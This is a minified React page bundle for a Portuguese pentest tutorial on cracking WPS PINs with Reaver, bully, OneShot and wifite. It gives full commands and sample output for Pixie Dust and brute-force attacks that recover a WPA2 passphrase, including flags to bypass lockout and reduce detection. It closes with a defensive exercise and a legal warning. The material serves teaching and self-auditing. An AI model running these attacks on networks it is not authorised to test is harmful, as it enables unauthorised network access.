import{j as e}from"./index-BofgBnE-.js";import{P as i}from"./PageContainer-B5fVeNJT.js";import{A as t}from"./AlertBox-B_JSQKUS.js";import{C as a}from"./CommandTable-Ck2MUBHP.js";import{T as o,P as s}from"./PracticeBox-BgVTSfiK.js";function l(){return e.jsxs(i,{title:"Reaver — WPS PIN brute force",subtitle:"Quebra a chave WPA2 explorando o PIN de 8 dígitos do WPS (Wi-Fi Protected Setup).",difficulty:"intermediario",timeToRead:"11 min",children:[e.jsx("h2",{children:"Por que WPS é fraco"}),e.jsxs("p",{children:["O ",e.jsx("strong",{children:"WPS PIN"})," tem 8 dígitos. Mas é dividido em 2 metades validadas independentemente, e o último dígito é checksum. Resultado: na prática são apenas"," ",e.jsx("strong",{children:"11000 PINs"})," possíveis. Em ~4-10 horas, qualquer um cai."]}),e.jsxs("p",{children:["Roteadores modernos (~2018+) implementam ",e.jsx("strong",{children:"rate-limit"})," ou desabilitam WPS por padrão. Mas equipamentos legados ainda são vulneráveis."]}),e.jsx("h2",{children:"Identificar APs com WPS"}),e.jsx(o,{path:"~",lines:[{cmd:"sudo airmon-ng check kill && sudo airmon-ng start wlan0",out:"(monitor mode)",outType:"muted"},{cmd:"sudo wash -i wlan0mon",out:`BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
24:5E:BE:1A:2C:01   6  -31  2.0  No   AtherosC  HomeWifi
D8:BB:2C:A1:42:F8  11  -52  2.0  Yes  Realtek   Vivo-2024     ← lockado
90:8D:78:99:88:01   1  -67  1.0  No   Atheros   NET_2GHZ      ← WPS 1.0!
AA:BB:CC:11:22:33   3  -71  2.0  No   Realtek   TP-LINK_8821  ← bom alvo`,outType:"info"}]}),e.jsx(a,{title:"Colunas do wash",variations:[{cmd:"WPS 1.0 / 2.0",desc:"Versão do WPS.",output:"1.0 = vulnerável a Pixie. 2.0 = pode ter rate limit."},{cmd:"Lck (Yes/No)",desc:"Locked = AP detectou ataque e travou WPS.",output:"Yes = ataque vai falhar até reset."},{cmd:"dBm",desc:"Sinal.",output:"Mais perto de 0 = melhor. -50 ou melhor é ideal."}]}),e.jsx("h2",{children:"Pixie Dust attack (instantâneo)"}),e.jsxs("p",{children:["Um bug em chips Realtek/Ralink antigos permite recuperar o PIN ",e.jsx("strong",{children:"offline"})," ","a partir de UMA tentativa, em segundos."]}),e.jsx(o,{path:"~",lines:[{cmd:"sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -K 1 -vvv",out:`Reaver v1.6.6 WiFi Protected Setup Attack Tool
Copyright (c) 2011-2012, Tactical Network Solutions, Craig Heffner

[+] Switching wlan0mon to channel 3
[+] Waiting for beacon from AA:BB:CC:11:22:33
[+] Associated with AA:BB:CC:11:22:33 (ESSID: TP-LINK_8821)
[+] Trying pin "12345670"
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message

[Pixie-Dust]
[+] AuthKey: 84c1...
[+] Hash1: 8c6f4a3d...
[+] Hash2: e1f4b2c7...
[+] PSK1: 1234
[+] PSK2: 5670
[+] PIN: 12345670

[+] WPS PIN: '12345670'
[+] WPA PSK: 'Senha@2024'
[+] AP SSID: 'TP-LINK_8821'
[+] Saving session at /var/lib/reaver/AABBCC112233.wpc`,outType:"success"}]}),e.jsx("h2",{children:"Brute force tradicional (lento)"}),e.jsx(o,{path:"~",lines:[{cmd:"sudo reaver -i wlan0mon -b 24:5E:BE:1A:2C:01 -vv -c 6 -L -N -d 15 -T .5 -r 3:15",out:`Reaver v1.6.6 WiFi Protected Setup Attack Tool

[+] Switching wlan0mon to channel 6
[+] Waiting for beacon from 24:5E:BE:1A:2C:01
[+] Received beacon from 24:5E:BE:1A:2C:01
[+] Trying pin "12345670"

[+] Trying pin "00005678"
[+] Trying pin "00015675"
[+] Trying pin "00025672"
[...]
[+] 0.45% complete @ 2026-04-03 17:14:33 (8 seconds/pin)
[+] 1.23% complete @ 2026-04-03 17:42:18 (8 seconds/pin)
[...]
(várias horas depois)
[+] 99.95% complete @ 2026-04-03 23:42:18 (8 seconds/pin)
[+] Pin cracked in 21342 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'Senha@2024'`,outType:"warning"}]}),e.jsx(a,{title:"Flags importantes do reaver",variations:[{cmd:"-i wlan0mon",desc:"Interface em monitor mode.",output:"Obrigatório."},{cmd:"-b BSSID",desc:"MAC do AP alvo.",output:"Do wash output."},{cmd:"-c 6",desc:"Canal (acelera, não precisa scanear).",output:"Do wash."},{cmd:"-K 1",desc:"Pixie Dust attack.",output:"TENTE PRIMEIRO — instantâneo se vulnerável."},{cmd:"-vv ou -vvv",desc:"Verbose.",output:"Mostra cada PIN tentado."},{cmd:"-L",desc:"Ignora 'WPS lock' do AP (insiste).",output:"Útil em alguns alvos."},{cmd:"-N",desc:"Não envia NACK em PIN inválido (mais furtivo).",output:"Reduz detecção."},{cmd:"-d 15",desc:"Delay (s) entre tentativas.",output:"Reduz para acelerar; aumenta para evitar lockout."},{cmd:"-T 0.5",desc:"Timeout em segundos.",output:"Padrão 5. Reduzir em LAN boa."},{cmd:"-r 3:15",desc:"A cada 3 tentativas, espera 15s (anti rate-limit).",output:"Combate WPS lock."},{cmd:"-p 12345670",desc:"Tenta PIN específico.",output:"Para confirmar PIN sabido."},{cmd:"-s session.wpc",desc:"Carrega sessão salva.",output:"Continua de onde parou."}]}),e.jsx("h2",{children:"bully — alternativa"}),e.jsx(o,{path:"~",lines:[{cmd:"sudo bully -b 24:5E:BE:1A:2C:01 -c 6 wlan0mon",out:`[!] Bully v1.4.7 - WPS vulnerability assessment utility

[+] Datalink type set to '127', radiotap headers present
[+] Scanning for beacon from '24:5E:BE:1A:2C:01' on channel '6'
[+] Got beacon for 'HomeWifi' (24:5E:BE:1A:2C:01)
[+] Loading 'pin' from 'AABBCC112233.run'

[+] Index of starting pin number is '0000000'
[+] Last State = 'NoAssoc'   Next pin '12345670'

[+] Pin counter advanced to 4 of 11000
[+] Tx( DeAuth ) = 'Timeout'   Next pin '00250671'

[+] Rx( M5 )    = 'Pin1Bad'   Next pin '00260678'   [...]`,outType:"info"}]}),e.jsx("h2",{children:"OneShot — ataque pixiedust com 1 comando"}),e.jsx(o,{path:"~",lines:[{cmd:"git clone https://github.com/kimocoder/OneShot.git && cd OneShot",out:"(implementação Python do pixiedust)",outType:"muted"},{cmd:"sudo python3 oneshot.py -i wlan0mon -b AA:BB:CC:11:22:33 -K",out:`[*] Trying PIN '12345670'
[*] Authenticating...
[*] M1 received
[*] Sending M2
[*] M3 received
[*] Sending M4
[*] M5 received
[+] WPS PIN: '12345670'
[+] WPA PSK: 'Senha@2024'
[+] AP SSID: 'TP-LINK_8821'
[+] Saved to /tmp/AABBCC112233.txt`,outType:"success"}]}),e.jsx("h2",{children:"Wifite — automação WPS também"}),e.jsx(o,{path:"~",lines:[{cmd:"sudo wifite --wps-only --pixie",out:`[+] Targets:

   NUM  ESSID                 CH  ENCR    POWER  WPS?  CLIENT
   ---  --------------        --  ----    -----  ----  ------
    1   HomeWifi               6  WPA2    98db   yes    1
    2   TP-LINK_8821           3  WPA2    71db   yes    0
    3   NET_2GHZ_4421          1  WPA2    67db   yes    0

[+] selecting all targets

[+] (1/3) attacking HomeWifi via WPS Pixie-Dust
[!] WPS Pixie-Dust failed: AP not vulnerable
[+] (2/3) attacking TP-LINK_8821 via WPS Pixie-Dust
[+] PIN: 12345670  PSK: Senha@2024
[+] saved as wpa-cracked.txt`,outType:"success"}]}),e.jsx(s,{title:"Identifique vulnerabilidade WPS na sua rede",goal:"Verificar se o seu próprio roteador tem WPS habilitado e Pixie Dust vulnerável.",steps:["Coloque a placa em monitor mode.","Rode wash e identifique seu BSSID.","Tente Pixie Dust (-K 1).","Se funcionar: DESABILITE WPS no admin do roteador.","Se travar: lockou — você está protegido contra brute, mas pode estar vulnerável a brute lento."],command:`sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo wash -i wlan0mon

# Achou seu AP? Anote BSSID + canal
sudo reaver -i wlan0mon -b SEU:BSSID -c CANAL -K 1 -vv

# Resultado:
# [+] WPS PIN encontrado em < 30s → Pixie vulnerável → desligue WPS no roteador
# [-] Falhou → ou WPS desabilitado, ou patch aplicado`,expected:`Em roteadores antigos: PIN aparece em segundos.
Em modernos: "WPS transaction failed (code: 0x04), re-trying last pin"
Roteadores recentes: WPS desabilitado de fábrica.`,verify:"Para confirmar 100%: tente conectar via WPS PIN no smartphone (Settings → WiFi → WPS PIN entry). Se aceitar → vulnerável."}),e.jsxs(t,{type:"info",title:"Defesa: desligue WPS",children:["Acesse ",e.jsx("code",{children:"192.168.1.1"})," ou ",e.jsx("code",{children:"192.168.0.1"})," → Wireless → WPS Settings → Disable. Esse é o único conselho que importa. Mesmo que use senha forte WPA2, WPS habilitado anula a proteção."]}),e.jsx(t,{type:"danger",title:"Crime se rede alheia",children:"Reaver/bully em AP que não é seu = acesso não autorizado mesmo se a senha for trivial. Use só no seu lab/rede ou com autorização formal."})]})}export{l as default};
